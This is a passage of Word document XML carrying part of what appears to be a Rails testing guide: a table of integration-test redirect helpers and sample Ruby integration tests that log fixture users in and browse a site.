              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>follow_redirect!</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="742E5F5C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>Follows a single redirect response.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="10812973" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="41C03934" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>request_via_redirect(http_method, path, [parameters], [headers])</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="065F4906" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">Allows you to make an </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="caps"/>
              </w:rPr>
              <w:t>HTTP</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> request and follow any subsequent redirects.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="080B3215" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="461FD215" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>post_via_redirect(path, [parameters], [headers])</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4DCB3709" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">Allows you to make an </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="caps"/>
              </w:rPr>
              <w:t>HTTP</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="caps"/>
              </w:rPr>
              <w:t>POST</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> request and follow any subsequent redirects.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="3A4B9CE5" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="308D12FE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>get_via_redirect(path, [parameters], [headers])</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2F1E5911" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">Allows you to make an </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="caps"/>
              </w:rPr>
              <w:t>HTTP</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="caps"/>
              </w:rPr>
              <w:t>GET</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> request and follow any subsequent redirects.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="4A39112B" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="01CECE1E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>patch_via_redirect(path, [parameters], [headers])</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="75C60EF7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">Allows you to make an </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="caps"/>
              </w:rPr>
              <w:t>HTTP</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="caps"/>
              </w:rPr>
              <w:t>PATCH</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> request and follow any subsequent redirects.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="246133DF" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0A547DB5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>put_via_redirect(path, [parameters], [headers])</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="66674F7C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">Allows you to make an </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="caps"/>
              </w:rPr>
              <w:t>HTTP</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="caps"/>
              </w:rPr>
              <w:t>PUT</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> request and follow any subsequent redirects.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="18306DB3" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="400FB419" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>delete_via_redirect(path, [parameters], [headers])</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="357D04DD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t xml:space="preserve">Allows you to make an </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="caps"/>
              </w:rPr>
              <w:t>HTTP</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="caps"/>
              </w:rPr>
              <w:t>DELETE</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> request and follow any subsequent redirects.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="009A002D" w14:paraId="073AEC7D" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="15" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="14ED3695" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML"/>
              </w:rPr>
              <w:t>open_session</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6B53C1B3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:t>Opens a new session instance.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7A8F1FA5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>5.2 Integration Testing Examples</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FBDEB89" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>A simple integration test that exercises multiple controllers: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E8E824B" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1401C482" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>require 'test_helper'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="22DC6B9F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7D1975AB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>UserFlowsTest &lt; ActionDispatch::IntegrationTest</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="54C42931" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  fixtures :users</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="046D1140" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="673B6C8F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  test "login and browse site"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6DC09F82" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    # login via https</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="11B43E35" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    https!</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4AC33405" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    get "/login"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3DAF8992" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    assert_response :success</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="123D7325" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5A770265" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    post_via_redirect "/login", :username</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; users(:avs).username, :password</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; users(:avs).password</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="22A3C020" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    assert_equal '/welcome', path</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7F0E4085" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    assert_equal 'Welcome avs!', flash[:notice]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="60CE37A9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="623A2649" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    https!(false)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6BDB9AD4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    get "/posts/all"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="62CFAED3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    assert_response :success</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5472BF93" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    assert assigns(:products)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="512C4BF5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2B6AE2E0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7C2945B1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">As you can see the integration test involves multiple controllers and exercises the entire stack from database to dispatcher. In addition you can have multiple session instances open simultaneously in a test and extend those instances with assertion methods to create a very powerful testing </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>DSL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (domain-specific language) just for your application.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56639E52" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Here’s an example of multiple sessions and custom </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>DSL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in an integration test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BFAF070" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="46BD95EB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>require 'test_helper'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="722D21F3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="487C4F5A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>UserFlowsTest &lt; ActionDispatch::IntegrationTest</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="63FD1512" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  fixtures :users</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7F1E4A86" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="481DE19A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  test "login and browse site"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3D64B294" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5B23A53D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    # User avs logs in</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="01870E53" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    avs = login(:avs)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="353D2E9D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    # User guest logs in</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="07321A2D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    guest = login(:guest)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2822E6DC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5DFF5216" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    # Both are now available in different sessions</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="26FCF51E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    assert_equal 'Welcome avs!', avs.flash[:notice]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="515436E5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    assert_equal 'Welcome guest!', guest.flash[:notice]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="26CAD578" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4E6C341C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    # User avs can browse site</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2817F602" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    avs.browses_site</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3A456A6B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    # User guest can browse site as well</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="14104D7C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
